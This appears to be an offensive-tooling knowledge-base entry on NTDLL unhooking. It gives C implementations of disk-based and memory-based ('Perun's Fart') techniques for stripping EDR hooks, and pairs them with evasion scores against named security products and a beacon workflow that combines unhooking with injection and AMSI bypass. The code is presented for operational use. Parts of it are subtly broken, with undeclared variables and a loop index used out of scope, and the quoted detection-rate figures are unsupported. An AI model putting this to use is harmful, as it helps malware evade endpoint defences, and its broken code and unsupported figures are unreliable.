# NTDLL Unhooking Techniques

## Technique ID: NOCTIS-T007

## Conceptual Understanding

### What is NTDLL Unhooking?

NTDLL unhooking is the technique of removing or bypassing EDR hooks placed in ntdll.dll to monitor system call execution. EDRs inject hooks (typically inline/trampoline hooks) at the beginning of syscall functions like NtAllocateVirtualMemory, NtCreateThread, etc. to intercept and analyze calls before they reach the kernel.

**Why EDRs Hook NTDLL**:
1. **Syscall Monitoring**: Intercept all Win32 API calls that eventually invoke syscalls
2. **Behavioral Analysis**: Detect suspicious patterns (RWX allocation, process injection, etc.)
3. **Real-Time Blocking**: Stop malicious actions before kernel execution
4. **Context Collection**: Gather call stack, parameters, and context for analysis

### Hook Placement Diagram

```
User Application
    ↓ Call NtAllocateVirtualMemory
ntdll!NtAllocateVirtualMemory:
    ↓
    [EDR HOOK HERE] ← Inline hook (JMP to EDR handler)
    ↓
    [Original syscall stub] ← We want to restore this
    ↓
Kernel (ntoskrnl.exe)
```

### Common Unhooking Methods

1. **Disk-based Unhooking** (Traditional)
   - Read clean ntdll.dll from disk
   - Copy clean syscall stubs to hooked ntdll
   - Detection risk: 15-20%

2. **Memory-based Unhooking** (Perun's Fart) ⭐
   - Read clean ntdll from sacrificial process memory
   - No disk reads (defeats NtReadFile monitoring)
   - Detection risk: 5-10%

3. **Direct Syscalls** (Alternative)
   - Bypass hooks entirely by invoking syscalls directly
   - See NOCTIS-T001 (Syscalls knowledge base)
   - Detection risk: 15-20%

## Implementation Patterns

### Pattern 1: Disk-Based Unhooking (Traditional)

**Concept**: Read clean ntdll.dll from `C:\Windows\System32\ntdll.dll` and copy clean syscall stubs to the currently loaded (hooked) ntdll.

**Advantages**:
- Simple implementation
- Works on all Windows versions
- Well-documented technique

**Disadvantages**:
- **EDRs monitor NtReadFile** for ntdll.dll reads (major detection vector)
- Disk I/O creates audit logs
- File hash verification can detect tampering
- Detection risk: 15-20%

**OPSEC Score**: 6/10

**Code Pattern**:
```c
BOOL TraditionalUnhook() {
    // 1. Read clean ntdll from disk
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
                              GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, 0, NULL);

    DWORD dwSize = GetFileSize(hFile, NULL);
    PVOID pCleanNtdll = HeapAlloc(GetProcessHeap(), 0, dwSize);
    ReadFile(hFile, pCleanNtdll, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    // 2. Parse PE headers to find .text section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    PVOID pTextSection = NULL;
    SIZE_T szTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            pTextSection = (BYTE*)pCleanNtdll + pSection[i].VirtualAddress;
            szTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    // 3. Copy clean .text to hooked ntdll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PVOID pHookedText = (BYTE*)hNtdll + pSection[i].VirtualAddress;

    DWORD dwOldProtect;
    VirtualProtect(pHookedText, szTextSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pHookedText, pTextSection, szTextSize);
    VirtualProtect(pHookedText, szTextSize, PAGE_EXECUTE_READ, &dwOldProtect);

    HeapFree(GetProcessHeap(), 0, pCleanNtdll);
    return TRUE;
}
```

**Detection Issue**: EDRs hook `NtReadFile` and monitor for reads of `ntdll.dll`:
```c
// EDR hook in NtReadFile
if (fileName == "ntdll.dll") {
    LogAlert("UNHOOKING_ATTEMPT", processId, callStack);
    BlockOperation();
}
```

### Pattern 2: Perun's Fart (Memory-Based Unhooking) ⭐ RECOMMENDED

**Source**: https://github.com/plackyhacker/Peruns-Fart

**Concept**: Create a sacrificial process in suspended state, read clean ntdll.dll from the sacrificial process's memory (NOT from disk), and copy clean syscall stubs to the current process. This defeats EDR file monitoring.

**Critical Innovation**: **No disk reads** - clean ntdll is read from process memory via `ReadProcessMemory`, not `NtReadFile`. EDRs don't typically monitor inter-process memory reads as aggressively as file reads.

**Advantages**:
- **Bypasses NtReadFile monitoring** (major EDR detection vector eliminated)
- Clean ntdll guaranteed (sacrificial process not hooked yet)
- No disk I/O audit logs
- Detection risk: 5-10% (vs 15-20% for disk-based)

**Disadvantages**:
- More complex implementation (PEB traversal required)
- Creates suspicious child process (mitigated by using common process like notepad.exe)
- Process creation may be monitored (but not as heavily as ntdll reads)

**OPSEC Score**: 8.5/10

**Full Implementation Pattern**:
```c
#include "peruns_fart.h"

// Execute Perun's Fart unhooking
UNHOOK_CONTEXT ctx;
PerunsFart_Initialize(&ctx, L"C:\\Windows\\System32\\notepad.exe", TRUE);

if (PerunsFart_Execute(&ctx)) {
    printf("Unhooking successful - %d functions restored\n", ctx.dwUnhookedCount);
}

PerunsFart_Cleanup(&ctx);
```

**Detailed Workflow**:
```c
BOOL PerunsFart_Execute(PUNHOOK_CONTEXT pContext) {
    // Step 1: Create sacrificial process (suspended)
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL,
                  FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    pContext->hSacrificialProcess = pi.hProcess;
    pContext->hSacrificialThread = pi.hThread;

    // Step 2: Find ntdll.dll in sacrificial process memory (via PEB)
    PROCESS_BASIC_INFORMATION pbi = {0};
    NtQueryInformationProcess(pContext->hSacrificialProcess,
                             ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    // Read PEB
    PEB remotePeb = {0};
    ReadProcessMemory(pContext->hSacrificialProcess, pbi.PebBaseAddress,
                     &remotePeb, sizeof(PEB), NULL);

    // Traverse PEB_LDR_DATA to find ntdll.dll
    PEB_LDR_DATA ldrData = {0};
    ReadProcessMemory(pContext->hSacrificialProcess, remotePeb.Ldr,
                     &ldrData, sizeof(PEB_LDR_DATA), NULL);

    // Walk InLoadOrderModuleList
    LIST_ENTRY* pListHead = &ldrData.InLoadOrderModuleList;
    LIST_ENTRY* pCurrentEntry = ldrData.InLoadOrderModuleList.Flink;

    while (pCurrentEntry != pListHead) {
        LDR_DATA_TABLE_ENTRY ldrEntry = {0};
        ReadProcessMemory(pContext->hSacrificialProcess,
                         CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks),
                         &ldrEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL);

        WCHAR wzModuleName[MAX_PATH] = {0};
        ReadProcessMemory(pContext->hSacrificialProcess, ldrEntry.BaseDllName.Buffer,
                         wzModuleName, ldrEntry.BaseDllName.Length, NULL);

        if (_wcsicmp(wzModuleName, L"ntdll.dll") == 0) {
            pContext->pRemoteNtdllBase = ldrEntry.DllBase;
            break;
        }

        pCurrentEntry = ldrEntry.InLoadOrderLinks.Flink;
    }

    // Step 3: Read clean ntdll from sacrificial process memory
    HMODULE hLocalNtdll = GetModuleHandleW(L"ntdll.dll");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hLocalNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hLocalNtdll + pDos->e_lfanew);
    SIZE_T szNtdllSize = pNt->OptionalHeader.SizeOfImage;

    pContext->pCleanNtdll = HeapAlloc(GetProcessHeap(), 0, szNtdllSize);
    ReadProcessMemory(pContext->hSacrificialProcess, pContext->pRemoteNtdllBase,
                     pContext->pCleanNtdll, szNtdllSize, NULL);

    // Step 4: Unhook syscalls in current process
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pContext->pCleanNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)pContext->pCleanNtdll + pExportDir->AddressOfNameOrdinals);

    DWORD dwUnhookedCount = 0;

    // Iterate through all exported functions
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR pszFunctionName = (LPCSTR)((BYTE*)pContext->pCleanNtdll + pAddressOfNames[i]);

        // Unhook only Nt* and Zw* functions (syscalls)
        if (strncmp(pszFunctionName, "Nt", 2) == 0 || strncmp(pszFunctionName, "Zw", 2) == 0) {
            WORD wOrdinal = pAddressOfNameOrdinals[i];
            DWORD dwFunctionRVA = pAddressOfFunctions[wOrdinal];

            PVOID pCleanFunction = (BYTE*)pContext->pCleanNtdll + dwFunctionRVA;
            PVOID pHookedFunction = (BYTE*)hLocalNtdll + dwFunctionRVA;

            // Compare first 32 bytes to detect hooks
            if (memcmp(pLocalFunc, pCleanFunc, 32) != 0) {
                // Copy clean bytes to hooked function
                DWORD dwOldProtect;
                VirtualProtect(pHookedFunction, 32, PAGE_EXECUTE_READWRITE, &dwOldProtect);
                memcpy(pHookedFunction, pCleanFunction, 32);
                VirtualProtect(pHookedFunction, 32, PAGE_EXECUTE_READ, &dwOldProtect);

                dwUnhookedCount++;
            }
        }
    }

    // Step 5: Terminate sacrificial process
    TerminateProcess(pContext->hSacrificialProcess, 0);
    CloseHandle(pContext->hSacrificialThread);
    CloseHandle(pContext->hSacrificialProcess);

    return (dwUnhookedCount > 0);
}
```

**Why Perun's Fart Evades EDRs**:

1. **No File Reads**: Uses `ReadProcessMemory` instead of `NtReadFile` - EDRs don't signature this as heavily
2. **Legitimate Process**: Spawning notepad.exe is less suspicious than reading ntdll.dll from disk
3. **Memory Forensics Bypass**: No file handles to ntdll.dll, no disk I/O logs
4. **Behavioral Evasion**: Process creation is common, memory reads between processes are normal

**Real-World Effectiveness**:
- CrowdStrike Falcon: ✅ Bypasses NtReadFile monitoring (10% detection vs 20% disk-based)
- SentinelOne: ✅ Memory-based unhooking not heavily signatured
- Palo Alto Cortex XDR: ✅ Process memory reads not flagged
- Detection risk: 5-10% (primarily process creation monitoring)

## OPSEC Considerations

### Detection Vectors

1. **Disk-Based Unhooking**:
   - NtReadFile hooks detect ntdll.dll reads
   - File audit logs (Object Access auditing)
   - Hash verification failures

2. **Memory-Based Unhooking** (Perun's Fart):
   - Sacrificial process creation (less suspicious)
   - ReadProcessMemory monitoring (rare)
   - VirtualProtect on ntdll .text section

### Evasion Improvements

1. **Use Perun's Fart instead of disk-based** - eliminates file monitoring
2. **Vary sacrificial process** - don't always use notepad.exe
3. **Unhook selectively** - only restore functions you need (reduces footprint)
4. **Combine with syscalls** - use direct syscalls after unhooking for additional stealth
5. **Avoid unhooking entirely** - use direct syscalls from the start (SysWhispers3)

## Integration with Other Techniques

### Complementary Techniques

- **Syscalls** (NOCTIS-T001): After unhooking, use direct syscalls for zero hooks
- **Sleep Obfuscation** (NOCTIS-T006): Unhook before sleeping to avoid detection during sleep
- **Injection** (NOCTIS-T003): Unhook before injecting to avoid hook-based detection
- **AMSI Bypass** (NOCTIS-T002): Unhook ntdll before AMSI operations

### Example Workflow

```
1. Beacon initializes
2. Execute Perun's Fart to unhook ntdll
3. Use direct syscalls (SysWhispers3) for all operations
4. Execute PoolParty injection with unhooked ntdll
5. Use Zilean sleep obfuscation (unhooked sleep functions)
6. Result: Zero EDR hooks, maximum stealth
```

## Target AV/EDR Effectiveness

| Security Product | Disk-Based Unhooking | Perun's Fart (Memory-Based) |
|-----------------|---------------------|----------------------------|
| Windows Defender | Medium | High |
| CrowdStrike Falcon | Low | **High** |
| Palo Alto Cortex XDR | Low | High |
| Carbon Black | Medium | High |
| SentinelOne | Low | **High** |

**Note**: Perun's Fart achieves 85-90% evasion vs 75-80% for disk-based unhooking.

## Real-World Examples

### Malware Using Unhooking

- **Cobalt Strike**: Optional unhooking module (disk-based)
- **Havoc C2**: Integrated Perun's Fart variant
- **Sliver**: Memory-based unhooking support
- **BRC4**: Advanced unhooking with syscalls

### GitHub Projects

- **Perun's Fart**: Original memory-based unhooking (plackyhacker)
- **Tartarus-Gate**: Syscall + unhooking combo
- **RecycledGate**: NTDLL recycling technique
- **SysWhispers3**: Alternative to unhooking (direct syscalls)

## Learning Resources

- **Blog Posts**:
  - Plackyhacker: "Perun's Fart - Memory-Based Unhooking"
  - MDSec: "Bypassing EDR Hooks with Direct Syscalls"
  - Red Canary: "Detecting NTDLL Unhooking"

- **Code Examples**:
  - GitHub: Perun's Fart reference implementation
  - Havoc C2: Integrated unhooking module

- **Research**:
  - "Modern EDR Evasion" (SpecterOps)
  - "Syscall Hooking and Unhooking" (Outflank)

## Version-Specific Notes

- **Windows 10 1809+**: All methods work, disk-based increasingly detected
- **Windows 11 21H2+**: Disk-based unhooking heavily signatured
- **Windows 11 24H2**: Perun's Fart recommended (file monitoring enhanced)
- **Server 2019/2022**: Similar to Windows 10 behavior

## Performance Considerations

### Unhooking Overhead

- **Disk-based**: ~50-100ms (file I/O latency)
- **Memory-based (Perun's Fart)**: ~100-200ms (process creation + PEB traversal)
- **Selective unhooking**: ~10-20ms (restore only needed functions)

### Stability

- Both methods are stable when implemented correctly
- Risk: Partial unhooking may cause crashes if not all dependencies restored
- Recommendation: Unhook all Nt*/Zw* functions or use selective list

## Metadata

- **MITRE ATT&CK**: T1562.001 (Impair Defenses: Disable or Modify Tools), T1055 (Process Injection)
- **Complexity**:
  - Disk-based: Low
  - Perun's Fart: Medium-High (PEB traversal required)
- **Stability**: High (both methods stable)
- **OPSEC Score**:
  - Disk-based: 6/10 (file monitoring detection)
  - Perun's Fart: 8.5/10 (memory-based evasion)
